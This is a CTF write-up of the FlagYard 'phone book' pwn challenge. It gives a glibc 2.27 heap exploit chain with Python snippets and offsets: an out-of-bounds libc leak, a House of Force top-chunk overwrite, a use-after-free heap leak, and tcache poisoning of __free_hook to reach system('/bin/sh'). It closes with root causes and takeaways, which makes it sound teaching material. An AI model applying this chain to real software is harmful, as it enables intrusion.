# FlagYard CTF — phone book

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** Flagyard
- **Category:** Pwn
- **Difficulty:** Medium (متوسط)

> *"The force of memory"*

---

## The short version

A classic menu-based notes app, but the index is *negative-index friendly* and the name field *overflows into the next chunk header*. "The force of memory" is literally whispering **House of Force** at us. The chain:

1. **Print record `-8`** → OOB read → **libc leak**.
2. Overflow the name to set **TOP chunk size = -1** → *House of Force*.
3. Free a chunk, then **UAF-print** it → **heap leak** (tcache key field).
4. House-of-Force **wrap the top pointer** so the next `malloc` lands **exactly on the tcache entries array**.
5. Write fake entry → **poison tcache `entries[5] = __free_hook`**.
6. `malloc(0x68)` returns **`__free_hook`** → write **`system`** there.
7. `free()` a chunk containing **`/bin/sh`** → `system("/bin/sh")` → shell → flag.

**Flag:** `FlagY{4c989e659bb339ecd04d969b9d2f2dc7}`

---

## First look

```
welcome to the phone book

 1- add new number
 2- print phone number
 3- delete record
```

A tiny phone book: `add(record)`, `print(index)`, `delete(index)`. Each record holds a **phone number** and a **name**.

```bash
$ file phone_book
ELF 64-bit LSB pie executable, x86-64
$ checksec phone_book
RELRO: Full RELRO   Stack: Canary found   NX: enabled   PIE: enabled
```

Full RELRO, canary, NX, PIE — the *boring* mitigations are all on. But glibc here is **2.27**:

- **tcache is on**, and it does **zero integrity checking** on the entries (no safe-linking yet, that's 2.32+).
- **Hooks like `__free_hook`** are plain writable pointers.

That combination is a gift. And the description — *"The force of memory"* — tells us exactly which primitive: **House of Force** (abusing the TOP chunk size so `malloc` gives us any address we want).

---

## Leak #1 — libc, for free (negative index)

The `print` feature reads the record at `index` without checking it's `>= 0`.

`print(-8)` walks the record array *backwards* out of bounds and prints whatever is sitting there as a "name". What lives there? A pointer chain that ends up pointing inside **libc** — specifically bytes of the **`_IO_2_1_stdout_` FILE struct** area (reached via `read@GOT`).

```python
name, num = pr(io, -8)            # print record -8
leak = u64(name.ljust(8, b"\x00")[:8])
base = (leak - leak % 0x1000) - (OFF_STDOUT - OFF_STDOUT % 0x1000)
```

Page-align the leaked pointer, subtract the fixed libc offset of `_IO_2_1_stdout_`, and we have the **libc base**:

```python
OFF_STDOUT    = 0x3ec760    # _IO_2_1_stdout_
OFF_SYSTEM    = 0x4f420     # system
OFF_FREE_HOOK = 0x3ed8e8    # __free_hook
```

Armed with the base, `__free_hook` and `system` are one addition away.

---

## The overflow → TOP chunk = -1

Records are added with a `size` and the **name gets written without a length check**. I allocate `0x68`, fill the name with `0x58` bytes, then:

```python
b"A" * 0x58 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
```

The last 8 bytes stomp the **size field of the TOP chunk** — the classic **House of Force** setup. From now on `malloc` believes the heap is *effectively infinite*, so any request can be satisfied by carving out of the "top" — even a request whose address is in the middle of nowhere.

We also need a **heap leak** to aim that aimed `malloc`. Delete chunk 0:

```python
delete(io, 0)                 # chunk 0x68 -> tcache bin #5
name, num = pr(io, 0)         # UAF: print the freed chunk
heap = u64(...) - 0x10
```

The freed chunk's tcache **key field** (a heap pointer) is still readable through the use-after-free → heap base recovered.

---

## The "force" part — landing on the tcache

Now the fun math. House of Force works like this:

```
evil_size = (target - 32 - av->top) mod 2^64
malloc(evil_size)   # carved from TOP, top wraps around
malloc(X)           # returns ~target
```

I want the next allocation's **user area** at `heap + 0x50` — because that's exactly where the **tcache entries array** lives.

```python
top    = heap + 0x2C0
target = heap + 0x50
evil   = (target - 32 - top) % (1 << 64)
add(io, to_signed(evil), b"0 ", skip_name=True)   # gap …
```

…and the *following* record lands with its user pointer **inside the tcache entries table**. Writing to its fields is writing the table itself:

```python
payload = b"\x00" * 32 + p64(__free_hook)
add(io, 0x48, str(b"/bin/sh") + b" ", payload)
```

- The **gap** zeroes the entries we don't care about (32 bytes).
- The **`p64(__free_hook)`** overwrites **`entries[5]`** — the freelist head for the `0x68` size class.

The very same chunk stores **`/bin/sh`** as its phone number for later.

---

## `malloc` is now a `system`-writing machine

Since `entries[5]` is poisoned, the next `malloc(0x68)` pops `__free_hook` *as if it were a freed chunk* and hands it back as a user pointer:

```python
add(io, 0x68, str(system).encode() + b" ", skip_name=True)
```

`__free_hook = system`. Done deal.

## The finishing touch: `free("/bin/sh")`

The land-chunk's phone number was `/bin/sh`. Freeing that chunk:

```python
delete(io, 1)
```

`free()` calls `__free_hook(ptr)` → **`system("/bin/sh")`** where the argument pointer *is* the chunk containing `/bin/sh`. Shell. Primo.

```python
io.sendline(b"echo PWNED")
io.sendline(b"cat flag 2>/dev/null || cat flag.txt 2>/dev/null || ls")
print(io.recvrepeat(3))
```

```python
FlagY{4c989e659bb339ecd04d969b9d2f2dc7}
```

---

## The 8-op recipe (the whole exploit at a glance)

| # | Action | Effect |
|---|---|---|
| 1 | `print(-8)` | libc leak (`_IO_2_1_stdout_`) |
| 2 | `add(0x68, overflow name)` | TOP chunk size = `-1` (HoF) |
| 3 | `free(0)` | chunk → tcache bin 5 |
| 4 | UAF `print(0)` | heap leak (key field) |
| 5 | `add(evil_size)` | wrap TOP → next malloc lands at `heap+0x50` |
| 6 | `add(0x48, "/bin/sh" + poison)` | `entries[5] = __free_hook` |
| 7 | `add(0x68, phone=system)` | `__free_hook = system` |
| 8 | `free(land)` | `system("/bin/sh")` → flag |

---

## Root causes (what actually went wrong)

| Bug | Where | Impact |
|---|---|---|
| Negative index accepted | `print` / `delete` | OOB read → libc & heap leaks |
| No length check on name | `add` | heap overflow → TOP size forged |
| TOP-chunk size trusted | allocator | House of Force arbitrary malloc |
| tcache with no integrity checks | glibc 2.27 | freelist poisoning (no safe-linking) |
| Writable `__free_hook` | glibc | function-pointer hijack |

---

## Takeaways

- **Index-0-or-`>= n` checks are not optional.** A negative index makes a *notes app* into a leak machine.
- **House of Force is a one-liner once the TOP chunk is forgeable:** sign-extend `(target - 0x20 - top)` into the allocation size and you control the next `malloc`.
- **glibc 2.27 tcache is free real estate.** No safe-linking, no `key` validation on `malloc` side — poison `entries[]` and you can make `malloc` output *anything*.
- **`free_hook` beats full RELRO.** GOT is read-only on Fedora-grade hardening, but the hooks in `.data` of libc stay writable — and `system` is one `u64` away.
- A playful description is a roadmap: *"The force of memory"* ≈ House of Force.

---

## The exploit

Colored, self-contained version in the same folder:

```
phone_book_solve.py
```

Run it and paste `host:port` (or pass it as a CLI argument), with a single
moving progress line while the 8 steps run:

```bash
python3 phone_book_solve.py
Enter the Phone Book challenge target (host:port): tcp.flagyard.com:29072
```

On success it prints the flag panel and saves the flag to
`flag_from_phone_book.txt` next to the script.

*The force of memory* — used wisely. 🏁